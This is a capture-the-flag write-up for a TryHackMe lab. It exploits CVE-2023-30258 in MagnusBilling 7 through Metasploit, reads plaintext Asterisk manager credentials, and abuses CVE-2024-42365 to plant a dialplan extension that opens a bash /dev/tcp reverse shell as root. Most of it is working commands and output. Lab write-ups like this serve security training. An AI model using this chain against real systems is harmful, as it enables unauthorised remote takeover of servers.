# Target
| Category          | Details                                                   |
|-------------------|-----------------------------------------------------------|
| 📝 **Name**       | [Billing](https://tryhackme.com/room/billing)             |  
| 🏷 **Type**       | THM Challenge                                             |
| 🖥 **OS**         | Linux                                                     |
| 🎯 **Difficulty** | Easy                                                      |
| 📁 **Tags**       | MagnusBilling 7, CVE-2023-30258, Asterisk, CVE-2024-42365 |

# Scan
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2  +deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 81:6e:cf:87:fb:97:49:36:a0:2d:d6:95:2e:76:80:5f (ECDSA)
|_  256 b2:66:5e:c3:14:36:c8:ff:94:10:a2:55:4e:70:1e:84 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.80.130.120/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```

# Attack path
1. [Gain initial foothold by exploiting CVE-2023-30258 in MagnusBilling 7](#gain-initial-foothold-by-exploiting-cve-2023-30258-in-magnusbilling-7)
2. [Escalate to `root` user by exploiting CVE-2024-42365 in `asterisk`](#escalate-to-root-user-by-exploiting-cve-2024-42365-in-asterisk)

### Gain initial foothold by exploiting CVE-2023-30258 in MagnusBilling 7

#### Identify MagnusBilling 7 running on the target
```
┌──(magicrc㉿perun)-[~/attack/THM Billing/asterisk]
└─$ curl http://10.80.173.156/mbilling/README.md  
###############
MagnusBilling 7
###############
<SNIP>
```
This version is vulnerable to [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)

#### Exploit [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258) to gain initial foothold
```
┌──(magicrc㉿perun)-[~/attack/THM Billing]
└─$ msfconsole -q                                                                                                                   
msf > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.81.131.74
RHOSTS => 10.81.131.74
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST tun0
LHOST => tun0
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LPORT 4444
LPORT => 4444
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 192.168.132.170:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.81.131.74:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 8 seconds.
[*] Elapsed time: 8.3 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (41224 bytes) to 10.81.131.74
[+] Deleted OKgSUGHmMeWb.php
[*] Meterpreter session 1 opened (192.168.132.170:4444 -> 10.81.131.74:51120) at 2025-12-03 21:27:38 +0100

meterpreter > getuid
Server username: asterisk
```

### Escalate to `root` user by exploiting [CVE-2024-42365](https://nvd.nist.gov/vuln/detail/CVE-2024-42365) in `asterisk`

#### Discover `asterisk` running as `root` user
```
meterpreter > ps

Process List
============

 PID   Name                                      User      Path
 ---   ----                                      ----      ----
<SNIP>
 1353  /usr/sbin/asterisk                        root      /usr/sbin/asterisk
<SNIP>
```

#### Discover `asterisk` credentials in plaintext in `manager.conf` file
```
meterpreter > cat /etc/asterisk/manager.conf
[general]
enabled = yes

port = 5038
bindaddr = 0.0.0.0
displayconnects = no

[magnus]
secret = magnussolution
deny=0.0.0.0/0.0.0.0
permit=127.0.0.1/255.255.255.0
read = system,call,log,verbose,agent,user,config,dtmf,reporting,cdr,dialplan
write = system,call,agent,user,config,command,reporting,originate
```
As connections on `0.0.0.0` are explicitly denied, we will need to access `127.0.0.1` via tunnel. 

#### Forward TCP 5038:127.0.0.1:5038
```
meterpreter > portfwd add -l 5038 -p 5038 -r 127.0.0.1
[*] Forward TCP relay created: (local) :5038 -> (remote) 127.0.0.1:5038
```

#### Start `netcat` to listen of reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM Billing]
└─$ nc -lvp 5555     
listening on [any] 5555 ...
```

#### Use `netcat` to connect to `asterisk` 
```
┌──(magicrc㉿perun)-[~/attack/THM Billing]
└─$ nc 127.0.0.1 5038
Asterisk Call Manager/2.10.6
Action: Login
Username: magnus
Secret: magnussolution

Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Status: Fully Booted
```

#### Exploit [CVE-2024-42365](https://nvd.nist.gov/vuln/detail/CVE-2024-42365) to add reverse shell spawning PBX extension
```
Action: Originate
Channel: Local/700@parkedcalls
Application: SET
Data: FILE(/etc/asterisk/extensions.conf,,,al)=exten => 111,1,System(/bin/bash -c 'sh -i >& /dev/tcp/192.168.132.170/5555 0>&1')

Response: Success
Message: Originate successfully queued
<SNIP>
```

#### Reload dial plan
```
Action:Command
Command:dialplan reload

Response: Follows
Privilege: Command
Dialplan reloaded.
<SNIP>
```

#### Display dial plan to find context of created PBX extension
```
Action:Command
Command:dialplan show
<SNIP>
[ Context 'ani' created by 'pbx_config' ]
  '111' =>          1. System(/bin/bash -c 'sh -i >& /dev/tcp/192.168.132.170/5555 0>&1') [pbx_config]
<SNIP>
```

#### Call PBX extension to spawn revere shell
```
Action:Command
Command:channel originate Local/111@ani extension 111@ani
<SNIP>
Application: System
AppData: /bin/bash -c 'sh -i >& /dev/tcp/192.168.132.170/5555 0>&1'
```

#### Confirm escalation
```
10.81.131.74: inverse host lookup failed: Unknown host
connect to [192.168.132.170] from (UNKNOWN) [10.81.131.74] 37126
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
